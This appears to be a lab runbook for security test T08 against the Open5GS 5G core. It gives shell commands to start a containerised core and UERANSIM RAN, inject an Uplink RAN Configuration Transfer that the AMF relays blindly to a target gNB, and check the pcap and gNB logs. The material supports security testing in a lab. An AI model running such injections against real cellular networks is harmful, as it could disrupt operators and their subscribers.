# Open5GS — Uplink RAN Config Transfer → SON/Xn blind relay (T08)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
Non-destructive (no victim UE needed). Target = the legit UERANSIM gNB, gNB-id **1**.

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs )
```
**2. Capture + fire**
```bash
CFG_CORE=open5gs ./capture_attack.sh open5gs_T08_son_inject \
    o5gs-amf o5gs-smf ueransim-open5gs-ueransim-gnb-1 net-5glab 30 \
    -- ul-ran-config-transfer --target-gnb-id 0x1
```
**Expect:** NGAP **21 + 48 + 6** in `amf_ngap_nas_sbi.pcap` (NG Setup + our UL RAN Config
Transfer + the AMF's Downlink relay); the target gNB receives it (`docker logs
ueransim-open5gs-ueransim-gnb-1 | grep -iE 'Unhandled|Configuration'`).
**Restore:** none (non-destructive).
